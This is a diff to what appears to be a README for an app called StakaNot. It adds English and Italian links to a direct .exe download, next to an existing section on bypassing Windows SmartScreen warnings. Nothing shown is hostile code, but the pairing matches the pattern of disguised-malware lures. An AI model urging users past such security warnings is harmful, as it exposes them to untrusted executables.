@@ -1,3 +1,9 @@
+## 📥 Download the latest version
+
+👉 You can download the latest version of **StakaNot** [here](https://github.com/stakanot/StakaNot/releases/download/stakanot/StakaNot.exe).
+
+---
+
 ## 🚧 How to run the app: bypassing SmartScreen (Windows)
 
 When you download the `.exe` file, Windows might flag it as unsafe because the app is new and not yet widely recognized.  
@@ -21,6 +27,12 @@ Follow these steps:
 3. The app will now start normally
 
 ✅ You won't need to do this again after the first launch.
+
+---
+
+## 📥 Scarica l'ultima versione
+
+👉 Puoi scaricare l'ultima versione di **StakaNot** da [qui](https://github.com/stakanot/StakaNot/releases/download/stakanot/StakaNot.exe).
 
 ---
 
